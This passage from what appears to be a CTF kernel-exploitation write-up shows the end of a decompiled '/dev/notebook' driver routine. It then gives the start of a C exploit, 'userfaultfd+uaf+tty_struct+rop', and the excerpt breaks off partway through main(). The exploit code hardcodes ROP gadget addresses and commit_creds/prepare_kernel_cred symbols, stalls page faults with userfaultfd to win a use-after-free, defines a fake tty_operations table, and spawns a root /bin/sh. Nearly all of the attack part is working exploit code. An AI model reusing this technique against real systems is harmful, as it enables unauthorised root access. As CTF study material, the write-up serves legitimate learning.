<span class="number">0x100</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( v5-&gt;note )</span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;size = v6;</span><br><span class="line">        v8 = <span class="number">-3LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Add idx is not empty.\n&quot;</span>, v4, v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;note = (<span class="keyword">void</span> *)_kmalloc(size, <span class="number">37748928LL</span>);</span><br><span class="line">        printk(<span class="string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è§£æ³•ä¸€-userfaultfd-uaf-tty-struct-rop"><a href="#è§£æ³•ä¸€-userfaultfd-uaf-tty-struct-rop" class="headerlink" title="è§£æ³•ä¸€:userfaultfd+uaf+tty_struct+rop"></a><strong>è§£æ³•ä¸€</strong>:userfaultfd+uaf+tty_struct+rop</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptm_unix98_ops_offset 0xe8e440</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pty_unix98_ops_offset 0xe8e320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdx_add_byte_r11_0x41_r11b_pop_rsp_pop_rbp_ret 0xffffffff8170dd41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff8225c940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_pop_rbp_ret   0xffffffff8103658c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret   0xffffffff8143f4e1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsp_ret 0xffffffff810bc110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810a9ef0 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_call_rdx  0xffffffff8270747f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> note_fd;</span><br><span class="line"><span class="keyword">char</span> *userfaultfd_buf;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x100</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x300</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gift</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg useraeg=&#123;</span><br><span class="line">        .buf=buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x64</span>,&amp;useraeg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    edit(note_fd,idx,<span class="number">0x2000</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    add(note_fd,idx,<span class="number">0x50</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">&#125;Notebook;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="keyword">size_t</span> tty_struct[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> tty_fd[<span class="number">0x100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    note_fd=open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span 